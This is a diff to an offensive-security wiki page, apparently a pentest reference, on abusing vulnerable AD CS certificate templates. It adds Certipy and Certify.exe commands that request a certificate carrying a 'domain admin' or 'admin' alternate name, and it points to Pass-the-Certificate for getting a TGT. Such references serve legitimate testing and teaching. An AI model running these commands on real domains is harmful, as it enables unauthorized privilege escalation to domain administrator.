@@ -27,6 +27,28 @@ certipy 'domain.local'/'user':'password'@'domaincontroller' find -vulnerable
 {% hint style="info" %}
 By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
 {% endhint %}
+
+Once a vulnerable template is found, a request shall be made to obtain a certificate.
+
+```bash
+certipy 'domain.local'/'user':'password'@'ca_server' req -ca 'ca_name' -template 'vulnerable template' -alt 'domain admin'
+```
+
+
+
+
+
+{% tabs %}
+{% tab title="Windows" %}
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
+{% endtab %}
+{% endtabs %}
+
+{% tabs %}
+{% tab title="Windows" %}
+
+{% endtab %}
+{% endtabs %}
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -43,8 +65,10 @@ Certify.exe find /vulnerable /currentuser
 Once a vulnerable template is found, a request shall be made to obtain a certificate.
 
 ```batch
-Certify.exe request /template:"Vulnerable template" /altname:"admin"
+Certify.exe request /ca:'domain\ca' /template:"Vulnerable template" /altname:"admin"
 ```
+
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
 {% endtab %}
 {% endtabs %}
 
